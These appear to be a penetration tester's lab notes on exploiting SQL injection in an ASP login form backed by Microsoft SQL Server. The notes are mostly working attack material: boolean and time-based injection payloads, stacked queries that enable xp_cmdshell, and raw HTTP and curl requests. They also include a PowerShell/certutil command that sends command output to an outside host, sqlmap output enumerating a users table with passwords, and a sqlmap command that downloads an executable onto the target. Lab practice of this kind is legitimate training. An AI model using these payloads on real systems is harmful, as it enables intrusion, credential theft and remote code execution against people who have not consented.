## 10.11.1.128:4167

**Payloads**
``` 
Parameter: uname (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: uname=a' OR NOT 4334=4334-- tXJC&psw=a

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: uname=a';WAITFOR DELAY '0:0:5'--&psw=a

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: uname=a' WAITFOR DELAY '0:0:5'-- dZJW&psw=a
```

**TODO:** Test if you can escalate to RCE
```
#https://infosecwriteups.com/how-i-escalated-a-time-based-sql-injection-to-rce-bbf0d68cb398

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36**_';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;--
```

**Enable xp_cmdshell**
```
';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;--
```

**Request to enable xp_cmdshell**
```
GET /loginform.asp?uname=a'%3bEXEC+sp_configure+'show+advanced+options',+1%3bRECONFIGURE%3bEXEC+sp_configure+'xp_cmdshell',+1%3bRECONFIGURE%3b-- HTTP/1.1
Host: 10.11.1.128:4167
Connection: close
```

**curl Request to enable xp_cmdshell**
```
curl -i -s -k -X $'GET' \
    -H $'Host: 10.11.1.128:4167' -H $'Connection: close' \
    $'http://10.11.1.128:4167/loginform.asp?uname=a\'%3bEXEC+sp_configure+\'show+advanced+options\',+1%3bRECONFIGURE%3bEXEC+sp_configure+\'xp_cmdshell\',+1%3bRECONFIGURE%3b--'
```


**Sample command to test for RCE**
``` 
powershell -c $output=whoami;certutil.exe -urlcache -split -f http://192.168.119.143/$output
```

```
';EXEC xp_cmdshell 'powershell -c $output=whoami;certutil.exe -urlcache -split -f http://192.168.119.143/$output';--
```

**Request containing a command**
```
GET /loginform.asp?uname=a';EXEC+xp_cmdshell+'powershell+-c+$output%3dwhoami%3bcertutil.exe+-urlcache+-split+-f+http%3a//192.168.119.145/$output';-- HTTP/1.1
Host: 10.11.1.128:4167
Connection: close
```

**curl Request containing a command**
```
curl -i -s -k -X $'GET' $'http://10.11.1.128:4167/loginform.asp?uname=a\';EXEC+xp_cmdshell+\'powershell+-c+$output%3dwhoami%3bcertutil.exe+-urlcache+-split+-f+http%3a//192.168.119.145/$output\';--'
```

**Database**
```
[00:14:50] [INFO] fetching number of databases
[00:14:50] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:14:50] [INFO] retrieved: 5
[00:14:55] [INFO] retrieved: model
[00:15:21] [INFO] retrieved: msdb
[00:15:39] [INFO] retrieved: music
[00:16:05] [INFO] retrieved: tempdb

```

**Tables of `music` database**
```
Database: music
[5 tables]
+----------+
| albums   |
| concerts |
| singles  |
| songs    |
| users    |
+----------+
```

**Columns of users table**
```
00:34:34] [INFO] fetching columns for table 'users' in database 'music'
[00:34:34] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:34:34] [INFO] retrieved: 3
[00:34:38] [INFO] retrieved: id
[00:34:55] [INFO] retrieved: name
[00:35:13] [INFO] retrieved: pass  
```

``` 
sqlmap -r request --level 5 --risk 3 --os-cmd="powershell Invoke-WebRequest -Uri http://192.168.119.143/r.exe -OutFile C:\Windows\Temp\r.exe -UseBasicParsing"
```